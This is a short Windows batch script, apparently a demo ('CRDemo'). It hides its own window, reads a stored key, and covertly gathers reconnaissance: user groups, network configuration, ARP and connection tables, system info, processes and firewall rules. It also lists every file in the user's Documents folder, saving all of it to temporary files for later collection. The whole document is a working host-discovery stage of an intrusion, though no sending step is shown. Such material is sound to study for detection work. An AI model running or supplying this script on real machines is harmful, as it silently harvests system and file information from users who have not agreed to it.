@if not "%~0"=="%~dp0.\%~nx0" start /min cmd /c,"%~dp0.\%~nx0" %* & goto :eof
for /f %%a in ('wmic os get LocalDateTime ^| findstr \.') DO set LDT=%%a
set filename=%LDT:~0,12%
set /p key= <"C:\CRDemo\tkn.txt"

C:\Windows\system32\cmd.exe /c whoami /groups >> %TEMP%\%filename%_scan.dat & ipconfig /all >> %TEMP%\%filename%_scan.dat & arp -a >> %TEMP%\%filename%_scan.dat & netstat -na >> %TEMP%\%filename%_scan.dat & systeminfo >> %TEMP%\%filename%_scan.dat & tasklist >> %TEMP%\%filename%_scan.dat & netsh advfirewall firewall show rule name=all >> %TEMP%\%filename%_scan.dat
C:\Windows\system32\cmd.exe /c dir /s "%userprofile%\Documents" /b /a-d >> %TEMP%\%filename%_files.dat
